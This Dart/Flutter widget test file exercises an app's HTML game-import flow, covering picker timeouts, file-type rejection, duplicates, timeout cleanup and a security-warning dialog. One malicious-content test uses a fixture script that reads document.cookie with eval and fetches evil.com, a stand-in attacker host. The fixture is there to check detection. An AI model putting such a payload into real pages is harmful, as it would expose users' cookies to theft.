/// F-M5-07 导入流程 UI 测试——file_picker 单 .html seam（超时兜底）→ 校验链
/// 预检 → 恶意命中拒绝 + 中文清单 + 强制二次确认 → 落盘 toast / 失败文案 +
/// hooks 接线（AppBar「导入」→ 导入流）。
///
/// 测试 seam（公共接口边界）：[SimulatorImportFlow]（resolveSimDir / pick /
/// runImportGame / platformTimeout 四依赖注入 fake，永不触真平台通道）+
/// 无头 widget 驱动；既有 SimulatorsView 接线经注入 fake flow 断言派发。
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';

import 'package:conver_system_mobile/services/simulator/import_service.dart'
    show ImportResult, SimulatorDuplicateError, SimulatorImportError;
import 'package:conver_system_mobile/services/simulator/manifest_parser.dart'
    show ManifestParseResult;
import 'package:conver_system_mobile/services/simulator/simulator_data_dir.dart'
    show SimulatorDataDir;
import 'package:conver_system_mobile/services/simulator/simulator_server.dart'
    show SimulatorServer;
import 'package:conver_system_mobile/theme/conver_theme.dart' show ConverTheme;
import 'package:conver_system_mobile/view_models/simulators_controller.dart'
    show SimulatorsController, SimulatorsState;
import 'package:conver_system_mobile/views/simulators/import_flow.dart'
    show SimulatorImportFlow;
import 'package:conver_system_mobile/views/simulators/simulators_hooks.dart'
    show SimulatorsHooks;
import 'package:conver_system_mobile/views/simulators/simulators_view.dart'
    show SimulatorsView;

/// 成功结果 fixture。
ImportResult okResult({String file = 'game.html', bool renamed = false}) =>
    ImportResult(
      game: <String, dynamic>{
        'id': 'game',
        'file': file,
        'name': 'game',
        'type': 'local',
        'source': 'imported',
      },
      renamed: renamed,
      warnings: const <String>[],
    );

/// 最小承载 Scaffold：按钮触发 [SimulatorImportFlow.handleImport]。
class _ImportHarness extends StatelessWidget {
  const _ImportHarness({required this.flow});

  final SimulatorImportFlow flow;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: ElevatedButton(
          onPressed: () => flow.handleImport(context),
          child: const Text('导入'),
        ),
      ),
    );
  }
}

Future<void> _pumpHarness(WidgetTester tester, SimulatorImportFlow flow) async {
  await tester.pumpWidget(
    MaterialApp(
      theme: ConverTheme.dark(),
      home: _ImportHarness(flow: flow),
    ),
  );
}

void main() {
  late Directory parent;

  setUp(() async {
    parent = await Directory.systemTemp.createTemp('m5-07-flow-');
  });

  tearDown(() async {
    if (await parent.exists()) {
      await parent.delete(recursive: true);
    }
  });

  group('handleImport — 选择 / 预检 / 恶意确认 / 落盘 toast 与失败文案', () {
    testWidgets('picker 用户取消（null）→ 零提示不崩、无落盘', (tester) async {
      final calls = <String>[];
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async => null,
        runImportGame: (dir, name, bytes) async {
          calls.add(name);
          return okResult();
        },
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();
      expect(calls, isEmpty);
      expect(find.text('导入成功'), findsNothing);
    });

    testWidgets('picker 挂起超时 → 「选择文件超时，请重试」不挂死', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () =>
            Completer<({String name, List<int> bytes})?>().future,
        runImportGame: (dir, name, bytes) async => okResult(),
        platformTimeout: const Duration(milliseconds: 50),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 60));
      await tester.pump();
      expect(find.text('选择文件超时，请重试'), findsOneWidget);
    });

    testWidgets('picker 抛错 → 「选择文件失败：…」', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async => throw StateError('平台通道故障'),
        runImportGame: (dir, name, bytes) async => okResult(),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();
      expect(find.text('选择文件失败：Bad state: 平台通道故障'), findsOneWidget);
    });

    testWidgets('非 .html → 明确拒绝文案（校验单源 400 语义）', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async => (name: 'game.txt', bytes: utf8.encode('x')),
        runImportGame: (dir, name, bytes) async => okResult(),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();
      expect(find.text('仅支持 .html 文件（当前：game.txt）'), findsOneWidget);
    });

    testWidgets('干净文件 → 直接落盘 + 成功 toast（无确认弹窗）', (tester) async {
      final calls = <String>[];
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'clean.html', bytes: utf8.encode('<html>干净</html>')),
        runImportGame: (dir, name, bytes) async {
          calls.add(name);
          return okResult(file: name);
        },
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(calls, ['clean.html']);
      expect(find.text('导入成功'), findsOneWidget);
    });

    testWidgets('改名导入 → toast 含「已改名为 xxx-2.html」', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'game.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) async => okResult(file: 'game-2.html', renamed: true),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(find.text('导入成功（已改名为 game-2.html）'), findsOneWidget);
    });

    testWidgets('重复导入（409 语义）→ 文案含「已存在」，不弹确认', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'dup.html', bytes: utf8.encode('<html>重复</html>')),
        runImportGame: (dir, name, bytes) async =>
            throw const SimulatorDuplicateError(
          '游戏已存在（内容与现有文件相同）：dup.html',
        ),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();
      expect(
        find.text('游戏已存在（内容与现有文件相同）：dup.html'),
        findsOneWidget,
      );
    });

    testWidgets('恶意命中 → 拒绝 + 中文清单 + 强制二次确认；取消 → 不落盘',
        (tester) async {
      final calls = <String>[];
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async => (
          name: 'risky.html',
          bytes: utf8.encode(
            '<script>eval(document.cookie); fetch("http://evil.com")</script>',
          ),
        ),
        runImportGame: (dir, name, bytes) async {
          calls.add(name);
          return okResult(file: name);
        },
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();

      // 拒绝 + 清单弹窗（三键中文文案逐字）。
      expect(find.text('导入安全警告'), findsOneWidget);
      expect(find.textContaining('使用 eval() 动态执行任意代码'), findsOneWidget);
      expect(find.textContaining('读取 document.cookie'), findsOneWidget);
      expect(find.textContaining('跨域 fetch 请求'), findsOneWidget);

      await tester.tap(find.text('取消'));
      await tester.pumpAndSettle();
      expect(calls, isEmpty, reason: '取消 → 不落盘');
      expect(find.text('已取消导入（未确认恶意内容）'), findsOneWidget);
    });

    testWidgets('恶意命中 → 二次确认放行 → 继续落盘 + 成功 toast', (tester) async {
      final calls = <String>[];
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async => (
          name: 'risky.html',
          bytes: utf8.encode('<script>eval("x")</script>'),
        ),
        runImportGame: (dir, name, bytes) async {
          calls.add(name);
          return okResult(file: name);
        },
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pumpAndSettle();
      expect(find.text('导入安全警告'), findsOneWidget);

      await tester.tap(find.text('我了解风险，继续导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(calls, ['risky.html'], reason: '知情放行 → 继续落盘');
      expect(find.text('导入成功'), findsOneWidget);
    });

    testWidgets('导入超时（runImport 挂起）→ 「导入超时，请重试」', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) =>
            Completer<ImportResult>().future,
        platformTimeout: const Duration(milliseconds: 50),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 60));
      await tester.pump();
      await tester.pump();
      expect(find.text('导入超时，请重试'), findsOneWidget);
    });

    testWidgets('F-34 导入超时 → 取消底层：迟到完成的落盘被补偿，无残留文件与 manifest 条目（重试不遇「已存在」）',
        (tester) async {
      final writes = <String>[];
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) async {
          // Fake 延迟完成：模拟底层 importGame 在超时后仍完成「写文件 + 注册」。
          // 同步 IO：widget test fake-async zone 中真实异步 IO future 不完成。
          await Future<void>.delayed(const Duration(milliseconds: 150));
          File(
            '${dir.path}${Platform.pathSeparator}game.html',
          ).writeAsStringSync('<html>x</html>');
          writes.add(name);
          return okResult(file: 'game.html');
        },
        platformTimeout: const Duration(milliseconds: 50),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 60));
      await tester.pump();
      expect(find.text('导入超时，请重试'), findsOneWidget);
      expect(find.text('导入成功'), findsNothing, reason: '超时取消 → 不呈现成功');

      // 等待底层延迟完成 + 取消补偿执行。
      await tester.pump(const Duration(milliseconds: 200));
      await tester.pump();
      await tester.pump();
      expect(writes, ['a.html'], reason: '底层 future 确在超时后完成（Dart 无法硬性中止）');
      expect(
        File('${parent.path}${Platform.pathSeparator}game.html').existsSync(),
        isFalse,
        reason: '超时取消后落盘副作用被补偿（无残留文件 → 重试不会遇「已存在」）',
      );
      final manifestFile =
          File('${parent.path}${Platform.pathSeparator}manifest.json');
      if (manifestFile.existsSync()) {
        final manifest = jsonDecode(manifestFile.readAsStringSync())
            as Map<String, dynamic>;
        final simulators = manifest['simulators'] as List;
        expect(
          simulators.where((e) => e is Map && e['id'] == 'game'),
          isEmpty,
          reason: '超时取消后 manifest 条目被注销（无幽灵条目）',
        );
      }
    });

    testWidgets('导入中不确定态：模态进度出现 → 完成后消失 + 成功 toast',
        (tester) async {
      final gate = Completer<ImportResult>();
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) => gate.future,
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(find.text('正在导入…'), findsOneWidget);

      gate.complete(okResult());
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(find.text('正在导入…'), findsNothing);
      expect(find.text('导入成功'), findsOneWidget);
    });

    testWidgets('数据目录解析挂起超时 → 「解析数据目录超时，请重试」', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () => Completer<Directory>().future,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) async => okResult(),
        platformTimeout: const Duration(milliseconds: 50),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 60));
      await tester.pump();
      await tester.pump();
      expect(find.text('解析数据目录超时，请重试'), findsOneWidget);
    });

    testWidgets('导入阶段 SimulatorImportError（异常形态）→ 文案直出', (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) async =>
            throw const SimulatorImportErrorImportPhase(),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(find.text('导入阶段失败（模拟）'), findsOneWidget);
    });

    testWidgets('导入阶段非预期错误（Error 形态）→ 「导入失败：」兜底不崩',
        (tester) async {
      final flow = SimulatorImportFlow(
        resolveSimDir: () async => parent,
        pickHtmlFile: () async =>
            (name: 'a.html', bytes: utf8.encode('<html>x</html>')),
        runImportGame: (dir, name, bytes) async => throw StateError('磁盘故障'),
      );
      await _pumpHarness(tester, flow);
      await tester.tap(find.text('导入'));
      await tester.pump();
      await tester.pump();
      await tester.pump();
      expect(find.text('导入失败：Bad state: 磁盘故障'), findsOneWidget);
    });
  });

  group('hooks 接线 — SimulatorsView 导入入口派发到导入流', () {
    late Directory parentDir;
    late SimulatorDataDir dataDir;

    setUp(() async {
      parentDir = await Directory.systemTemp.createTemp('m5-07-view-');
      dataDir = SimulatorDataDir(resolveDocumentsDir: () async => parentDir);
    });

    testWidgets('AppBar「导入」→ 派发注入 flow 的 handleImport（默认 hooks 下自动接线）',
        (tester) async {
      final recordingFlow = _RecordingFlow();
      final controller = SimulatorsController(
        dataDir: dataDir,
        seed: (_) async => false,
        createServer: (_) => _StubServer(reportPort: 8642),
        loadManifest: (_) async => const ManifestParseResult.success([]),
        port: 0,
      );
      addTearDown(controller.dispose);

      await tester.pumpWidget(
        MaterialApp(
          theme: ConverTheme.dark(),
          home: SimulatorsView(controller: controller, importFlow: recordingFlow),
        ),
      );
      // flush：post-frame 接线 + 控制器 _chain 零延迟 timer（ensureStarted）。
      await _settleController(tester, controller);
      final importButton = tester.widget<IconButton>(
        find.widgetWithIcon(IconButton, Icons.file_open_outlined),
      );
      expect(importButton.onPressed, isNotNull,
          reason: 'F-M5-07 接线后导入入口不再禁用');

      await tester.tap(find.byTooltip('导入'));
      await tester.pump();
      expect(recordingFlow.handleCalls, 1, reason: 'AppBar 导入入口派发到导入流');
    });

    testWidgets('既有注入钩子优先：constructor hooks.onImportTap 不被覆盖', (tester) async {
      var injectedTaps = 0;
      final controller = SimulatorsController(
        dataDir: dataDir,
        seed: (_) async => false,
        createServer: (_) => _StubServer(reportPort: 8642),
        loadManifest: (_) async => const ManifestParseResult.success([]),
        port: 0,
        hooks: SimulatorsHooksWithTap(() => injectedTaps++),
      );
      addTearDown(controller.dispose);

      await tester.pumpWidget(
        MaterialApp(
          theme: ConverTheme.dark(),
          home: SimulatorsView(controller: controller, importFlow: _RecordingFlow()),
        ),
      );
      await _settleController(tester, controller);
      await tester.tap(find.byTooltip('导入'));
      await tester.pump();
      expect(injectedTaps, 1, reason: 'constructor 注入钩子优先于默认接线');
    });
  });
}

/// 记录 handleImport 调用次数的 fake flow（接线派发断言用）。
class _RecordingFlow extends SimulatorImportFlow {
  int handleCalls = 0;

  @override
  Future<void> handleImport(BuildContext context) async {
    handleCalls++;
  }
}

/// 记录点击的 hooks（继承公开槽位，仅注入 onImportTap）。
class SimulatorsHooksWithTap extends SimulatorsHooks {
  SimulatorsHooksWithTap(this.onTap);
  final VoidCallback onTap;

  @override
  VoidCallback? get onImportTap => onTap;
}

/// 服务器桩（复用 W3 测试模式：真实监听能力不在本票范围）。
class _StubServer extends SimulatorServer {
  _StubServer({required this.reportPort}) : super(Directory.systemTemp);

  final int reportPort;
  bool _running = false;

  @override
  Future<int> start({required int port}) async {
    _running = true;
    return reportPort;
  }

  @override
  Future<void> stop() async {}

  @override
  bool get isRunning => _running;
}

/// pump 至控制器离开 loading（flush 懒启动编排的零延迟 timer 与微任务链）。
Future<void> _settleController(
  WidgetTester tester,
  SimulatorsController controller,
) async {
  for (var i = 0; i < 200 && controller.state == SimulatorsState.loading; i++) {
    await tester.pump(const Duration(milliseconds: 10));
  }
  await tester.pump();
}

/// 导入阶段异常形态（400 文案直出路径的注入载体）。
class SimulatorImportErrorImportPhase extends SimulatorImportError {
  const SimulatorImportErrorImportPhase()
      : super('导入阶段失败（模拟）');
}